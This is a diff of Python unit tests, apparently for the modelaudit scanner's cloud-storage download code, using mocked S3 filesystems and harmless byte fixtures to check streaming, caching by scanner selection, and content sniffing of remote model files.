+    tflite_url = "s3://bucket/models/evil.payload"
+    tflite_payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
+    fs = make_fs_mock()
+    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(tflite_payload)
+    configure_remote_open_payloads(fs, {tflite_url: tflite_payload})
+    mock_fs_class.return_value = fs
+    mock_analyze.return_value = {
+        "type": "directory",
+        "file_count": 1,
+        "total_size": len(tflite_payload),
+        "human_size": "24 B",
+        "estimated_time": "instant",
+        "files": [
+            {
+                "path": tflite_url,
+                "name": "evil.payload",
+                "size": len(tflite_payload),
+                "human_size": "24 B",
+            }
+        ],
+    }
+
+    streamed = list(download_from_cloud_streaming(url, show_progress=False))
+
+    assert len(streamed) == 1
+    assert streamed[0][1] is True
+    fs.open.assert_called_once_with(tflite_url, "rb")
+    fs.get.assert_called_once()
+    assert fs.get.call_args.args[0] == tflite_url
+
+
 @patch("fsspec.filesystem")
 def test_download_from_cloud_fails_closed_on_partial_directory_metadata_error(
     mock_fs_class: MagicMock,
@@ -399,6 +1239,80 @@ def test_download_from_cloud_reuses_cache_with_matching_etag(mock_fs: MagicMock,
     assert first.read_bytes() == b"data"
     downloader.get.assert_called_once()
     assert mock_fs.call_count == 3
+
+
+@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
+@patch("fsspec.filesystem")
+def test_download_from_cloud_isolates_selective_directory_cache_by_scanner_selection(
+    mock_fs_class: MagicMock,
+    mock_analyze: AsyncMock,
+    tmp_path: Path,
+) -> None:
+    url = "s3://bucket/models/"
+    payloads = {
+        "s3://bucket/models/weights.safetensors": make_safetensors_payload(),
+        "s3://bucket/models/model.pkl": b"\x80\x04N.",
+    }
+    files = [
+        {
+            "path": file_url,
+            "name": Path(file_url).name,
+            "size": len(payload),
+            "human_size": f"{len(payload)} B",
+        }
+        for file_url, payload in payloads.items()
+    ]
+    mock_analyze.return_value = {
+        "type": "directory",
+        "etag": "directory-etag",
+        "file_count": len(files),
+        "total_size": sum(len(payload) for payload in payloads.values()),
+        "human_size": "small",
+        "estimated_time": "instant",
+        "files": files,
+    }
+    fs = make_fs_mock()
+    fs.info.return_value = {"type": "directory"}
+    configure_remote_open_payloads(fs, payloads)
+    fs.get.side_effect = lambda src, dst: Path(dst).write_bytes(payloads[src])
+    mock_fs_class.return_value = fs
+
+    safetensors_policy = resolve_scanner_selection_policy(scanners=["safetensors"])
+    pickle_policy = resolve_scanner_selection_policy(scanners=["pickle"])
+    cache_dir = tmp_path / "cache"
+
+    safetensors_path = download_from_cloud(
+        url,
+        cache_dir=cache_dir,
+        show_progress=False,
+        scannable_extensions=selected_scanner_extensions(safetensors_policy, conservative=True),
+        scannable_filenames=selected_scanner_filenames(safetensors_policy, conservative=True),
+        scanner_selection=safetensors_policy.to_config(),
+    )
+    pickle_path = download_from_cloud(
+        url,
+        cache_dir=cache_dir,
+        show_progress=False,
+        scannable_extensions=selected_scanner_extensions(pickle_policy, conservative=True),
+        scannable_filenames=selected_scanner_filenames(pickle_policy, conservative=True),
+        scanner_selection=pickle_policy.to_config(),
+    )
+    cached_pickle_path = download_from_cloud(
+        url,
+        cache_dir=cache_dir,
+        show_progress=False,
+        scannable_extensions=selected_scanner_extensions(pickle_policy, conservative=True),
+        scannable_filenames=selected_scanner_filenames(pickle_policy, conservative=True),
+        scanner_selection=pickle_policy.to_config(),
+    )
+
+    assert isinstance(safetensors_path, Path)
+    assert isinstance(pickle_path, Path)
+    assert safetensors_path != pickle_path
+    assert cached_pickle_path == pickle_path
+    assert {path.name for path in safetensors_path.iterdir()} == {"weights.safetensors"}
+    assert {path.name for path in pickle_path.iterdir()} == {"model.pkl"}
+    assert [call.args[0] for call in fs.get.call_args_list] == list(payloads)
 
 
 @patch("fsspec.filesystem")
@@ -1128,10 +2042,17 @@ class TestCloudPathSecurity:
     ) -> None:
         fs = make_fs_mock()
         fs.info.return_value = {"type": "file", "size": 512}
-        fs.open.return_value = BytesIO(b"model")
         mock_fs_class.return_value = fs
 
         model_url = "s3://bucket/models/model.pkl"
+        preview_url = "s3://bucket/models/preview.png"
+        configure_remote_open_payloads(
+            fs,
+            {
+                model_url: b"model",
+                preview_url: b"\x89PNG\r\n\x1a\n",
+            },
+        )
         mock_analyze.return_value = {
             "type": "directory",
             "file_count": 2,
@@ -1140,7 +2061,7 @@ class TestCloudPathSecurity:
             "estimated_time": "instant",
             "files": [
                 {"path": model_url, "name": "model.pkl", "size": 512, "human_size": "512 B"},
-                {"path": "s3://bucket/models/preview.png", "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
+                {"path": preview_url, "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
             ],
         }
 
@@ -1154,7 +2075,8 @@ class TestCloudPathSecurity:
 
         assert result == tmp_path
         fs.info.assert_called_once_with(model_url)
-        fs.open.assert_called_once_with(model_url, "rb")
+        fs.open.assert_any_call(preview_url, "rb")
+        fs.open.assert_any_call(model_url, "rb")
         fs.get.assert_not_called()
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@@ -1382,10 +2304,17 @@ class TestCloudPathSecurity:
     ) -> None:
         fs = make_fs_mock()
         fs.info.return_value = {"type": "file", "size": 512}
-        fs.open.return_value = BytesIO(b"model")
         mock_fs_class.return_value = fs
 
         model_url = "s3://bucket/models/model.pkl"
+        preview_url = "s3://bucket/models/preview.png"
+        configure_remote_open_payloads(
+            fs,
+            {
+                model_url: b"model",
+                preview_url: b"\x89PNG\r\n\x1a\n",
+            },
+        )
         mock_analyze.return_value = {
             "type": "directory",
             "file_count": 2,
@@ -1394,7 +2323,7 @@ class TestCloudPathSecurity:
             "estimated_time": "instant",
             "files": [
                 {"path": model_url, "name": "model.pkl", "size": 512, "human_size": "512 B"},
-                {"path": "s3://bucket/models/preview.png", "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
+                {"path": preview_url, "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
             ],
         }
 
@@ -1408,7 +2337,8 @@ class TestCloudPathSecurity:
 
         assert len(streamed) == 1
         fs.info.assert_called_once_with(model_url)
-        fs.open.assert_called_once_with(model_url, "rb")
+        fs.open.assert_any_call(preview_url, "rb")
+        fs.open.assert_any_call(model_url, "rb")
         fs.get.assert_not_called()
 
     @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
